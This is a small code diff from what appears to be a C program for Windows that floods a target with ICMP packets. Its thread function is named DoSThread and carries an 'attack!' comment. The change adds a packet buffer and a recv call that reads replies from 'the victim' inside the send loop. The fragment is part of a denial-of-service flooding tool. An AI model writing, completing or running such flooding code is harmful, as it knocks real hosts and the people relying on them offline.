@@ -165,9 +165,13 @@ DWORD WINAPI DoSThread(LPVOID lParam)
 	//wait...
 	while (!start)Sleep(10);//We use Sleep to keep the CPU usage low. If we won't use it, the CPU will probably be at 100%
 	//attack!
+	ICMP_Pkt* i = (ICMP_Pkt*)malloc(info->pkt_size);
+	if (!i)exit(-1);
 	while (run)
 	{
 		sent = send(sock, (char*)info->pkt, info->pkt_size, 0);
+		//Sometimes the victim replies (super rare). Here we just read those packets from the victim.
+		recv(sock, (char*)i, info->pkt_size, MSG_WAITALL);
 		pings++;
 		if (sent <= 0)
 		{
